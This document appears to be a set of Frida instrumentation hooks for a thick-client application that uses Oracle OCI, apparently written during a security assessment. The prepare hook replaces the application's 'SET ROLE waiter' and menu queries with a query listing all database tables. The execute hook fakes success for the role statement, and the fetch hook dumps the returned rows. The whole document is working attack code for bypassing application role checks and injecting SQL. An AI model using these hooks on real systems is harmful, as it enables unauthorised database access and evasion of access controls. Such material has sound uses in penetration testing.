prepare
```js
if (!globalThis.rolehandle) { globalThis.rolehandle = ""; }

defineHandler({
  onEnter(log, args, state) {
    log('OCIStmtPrepare()');
    const stmtp = args[0];
    const sqlPtr = ptr(args[2]);
    const sqlLen = args[3].toInt32();
    const originalSql = Memory.readUtf8String(sqlPtr, sqlLen);
    log('sql: ' + originalSql);

    if (originalSql == "SET ROLE waiter") {
      log('Storing handle for role statement');
      globalThis.rolehandle = stmtp;

	const newSql = "SELECT 1, TABLE_NAME, OWNER FROM all_tables";
      const newSqlBuffer = Memory.allocUtf8String(newSql);
      args[2] = newSqlBuffer;
      args[3] = ptr(newSql.length);
      globalThis.sqlBuffer = newSqlBuffer;
      log('New sql: ' + newSql);

    } else if (originalSql === "SELECT * FROM SYS.MENU") {
      const newSql = "SELECT 1, TABLE_NAME, OWNER FROM all_tables";
      const newSqlBuffer = Memory.allocUtf8String(newSql);
      args[2] = newSqlBuffer;
      args[3] = ptr(newSql.length);
      globalThis.sqlBuffer = newSqlBuffer;
      log('New sql: ' + newSql);
    } else {
      globalThis.rolehandle = "";
    }

    if (globalThis.sqlBuffer) {
      log('sql arg after injection: ' + Memory.readUtf8String(args[2], args[3].toInt32()));
    }
  }
});
```

Exec
```js
defineHandler({
  onEnter(log, args, state) {
    log('OCIStmtExecute()');
    let stmtp = args[1];
    globalThis.exechandle = stmtp;
    globalThis.errhp = args[2];
    log(`errhp: ${globalThis.errhp}`);
  },
  onLeave(log, retval, state) {
    let returnval = retval.toInt32();
    if (returnval != 0) {
      log('OCIStmtExecute return value: ' + returnval);
      try {
        if (globalThis.errhp && !globalThis.errhp.isNull()) {
          let errbuf = Memory.alloc(512);
          let errcode = Memory.alloc(4);
          let OCIErrorGet = new NativeFunction(
            Module.getExportByName(null, 'OCIErrorGet'),
            'int',
            ['pointer', 'uint32', 'pointer', 'pointer', 'uint32', 'uint32']
          );
          let result = OCIErrorGet(globalThis.errhp, 1, errcode, errbuf, 512, 1);
          if (result == 0) {
            let errcodeVal = Memory.readInt(errcode);
            let errMsg = Memory.readUtf8String(errbuf);
            log(`OCIStmtExecute error: Code ${errcodeVal}, Message: ${errMsg}`);
          } else {
        log(`Failed to retrieve error details (OCIErrorGet result: ${result})`);
          }
        } else {
          log('Invalid or null errhp');
        }
      } catch (e) {
        log(`Error in OCIErrorGet: ${e}`);
      }
      if (globalThis.exechandle.equals(globalThis.rolehandle)) {
        log('Setting return value to 0 for role sql');
        retval.replace(0);
      } else {
        log('Not modifying return value for SELECT sql');
      }
    }
  }
});
```

DefPos
```js
globalThis.buffers = [];

defineHandler({
  onEnter(log, args, state) {
    log('OCIDefineByPos()');
    const buf = args[4];
    const size = args[5].toInt32();
    const dt = args[6].toInt32();
    const rlenp = args[8];
    globalThis.buffers.push({ buf, size, dt, rlenp });
    log('Stored:\nbuf: ' + buf + '\nsize: ' + size + '\ndt: ' + dt + '\nrlenp: ' + rlenp + '\n');
  },
  onLeave(log, retval, state) {}
});
```

Fetch
```js
defineHandler({
  onEnter(log, args, state) {
    log('OCIStmtFetch()');
    globalThis.fetch_errhp = args[1];
    log(`fetch_errhp: ${globalThis.fetch_errhp}`); // Debug errhp
  },
  onLeave(log, retval, state) {
    const ret = retval.toInt32();
    log('OCIStmtFetch return value: ' + ret);
    if (ret == -1) {
      try {
        if (globalThis.fetch_errhp && !globalThis.fetch_errhp.isNull()) {
          let errbuf = Memory.alloc(512);
          let errcode = Memory.alloc(4);
          let OCIErrorGet = new NativeFunction(
            Module.getExportByName(null, 'OCIErrorGet'),
            'int',
            ['pointer', 'uint32', 'pointer', 'pointer', 'uint32', 'uint32']
          );
    let result = OCIErrorGet(globalThis.fetch_errhp, 1, errcode, errbuf, 512, 1);
          if (result == 0) {
            let errcodeVal = Memory.readInt(errcode);
            let errMsg = Memory.readUtf8String(errbuf);
            log(`OCIStmtFetch error: Code ${errcodeVal}, Message: ${errMsg}`);
          } else {
            log(`Failed to retrieve fetch error details (OCIErrorGet result: ${result})`);
          }
        } else {
          log('Invalid or null fetch_errhp');
        }
      } catch (e) {
        log(`Error in OCIErrorGet: ${e}`);
      }
    } else if (ret == 0) {
      for (let i = 0; i < globalThis.buffers.length; i++) {
        const { buf, size, dt, rlenp } = globalThis.buffers[i];
        log('Buffer ' + i + ' DataType: ' + dt);
        if (rlenp) {
          const actualLength = Memory.readU16(rlenp);
          log('Actual length: ' + actualLength);
          if (dt == 1) {
            try {
              const value = Memory.readUtf8String(buf, actualLength);
              log('Value: ' + value);
              } catch (e) {
              log('Error reading string: ' + e);
              log('Hex dump: ' + hexdump(buf, { length: actualLength }));
            }
          } else if (dt == 3) {
            const value = Memory.readInt(buf);
            log('Integer value: ' + value);
          } else {
            log('Non-string value (hex): ' + hexdump(buf, { length: size }));
          }
        }
      }
    } else {
      log('Fetch failed or no data (retval: ' + ret + ')');
    }
  }
});
```